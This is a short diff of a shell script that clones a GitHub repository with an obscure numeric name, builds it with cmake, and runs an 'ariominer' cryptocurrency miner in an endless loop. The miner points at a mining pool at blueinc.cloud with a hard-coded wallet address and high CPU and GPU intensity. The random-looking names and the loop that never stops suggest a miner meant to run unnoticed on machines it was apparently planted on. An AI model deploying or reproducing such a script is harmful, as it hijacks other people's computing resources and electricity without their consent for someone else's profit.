@@ -1,7 +1,5 @@
-apt-get update
-apt-get install cmake -y
-git clone https://github.com/mobileapps84741274/linux8474888874
-cd ./linux8474888874/
+git clone https://github.com/mobileapps84741274/blueinc84747474/
+cd ./blueinc84747474/
 mkdir linux84748874
 cd linux84748874
 cmake ..
@@ -10,6 +8,6 @@ make
 while true
 do
 
-./linux848888888874 linux8474
+./ariominer --mode miner --pool http://www.blueinc.cloud:8884 --wallet 3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3 --name linux8474 --cpu-intensity 88 --gpu-intensity-cblocks 98 --gpu-intensity-gblocks 98 
 
 done
